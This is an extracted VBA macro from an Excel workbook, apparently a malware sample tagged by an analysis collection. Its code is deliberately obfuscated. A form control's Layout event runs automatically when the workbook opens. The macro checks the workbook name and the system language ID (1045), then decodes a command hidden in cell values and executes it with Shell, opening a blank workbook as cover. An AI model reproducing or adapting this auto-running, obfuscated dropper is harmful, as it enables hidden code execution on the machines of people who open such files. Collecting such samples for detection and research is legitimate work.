Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "borderstyle, 1, 0, MSForms, Frame"
Attribute VB_Control = "prnt, 2, 1, MSForms, CommandButton"

Private Sub borderstyle_Layout()
Debug.Print: ThisWorkbook.comaro: Debug.Print ""
End Sub

Private Sub prnt_Click()
Debug.Print "": ThisWorkbook.comaro:
End Sub
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Const leftt = 5
Function cobos()
oko = Left((sokia), 2) + 0
cobos = Cells(oko, oko)
End Function
Sub toro()
Dim boll As Workbook
Set boll = Workbooks.Add
End Sub
Sub comaro()
G = "0"
If Mid(ActiveWorkbook.Name, Len(ActiveWorkbook.Name) - 4, 1) = G Then corecc
End Sub


Function frug()
frug = Zero + False
End Function
Function afa()
afa = msoLanguageIDUI
End Function
Function sokia()
sokia = Application.LanguageSettings.LanguageID(afa)
End Function

Function corecc()
If sokia = 209 * leftt Then Shell venus, msoSyncConflictClientWins
toro
End Function

Function venus()
Dim des, kes As String: des = "": kes = des
For t = leftt To 8
des = des + Zerro(Cells(t, leftt - 1))
Next t
For w = leftt To 8
kes = kes + Zerro(Cells(w, leftt))
Next w
venus = des + cobos & kes
End Function
Function Zerro(ByVal finde As String) As String
J = 1
Dim CGu, subb, hole As Integer
Dim Nnul As Integer
Dim arrg() As Integer
Dim vexel() As Long
subb = IIf(Right(finde, 1) Mod 2 = frug, leftt, leftt - J)
finde = Left(finde, Len(finde) - IIf(Right(finde, 1) Mod 2 = frug, J, J))
hole = Len(finde) / subb - J
ReDim arrg(hole): ReDim vexel(hole)
Nnul = frug: CGu = frug
For CGu = frug To hole
arrg(CGu) = CGu - (hole + J)
Next CGu
For Nnul = frug To hole
For CGu = frug To hole
If CInt(Mid(finde, CGu * subb + J, subb - 3)) = Nnul Then
vexel(Nnul) = (Mid(finde, (CGu + J) * subb - 2, 3) + arrg(Nnul))
Exit For
End If
Next CGu
Next Nnul
Zerro = "" + ""
For Nnul = frug To hole
Zerro = Zerro & Chr(vexel(Nnul))
Next Nnul
End Function


INQUEST-PP=macro
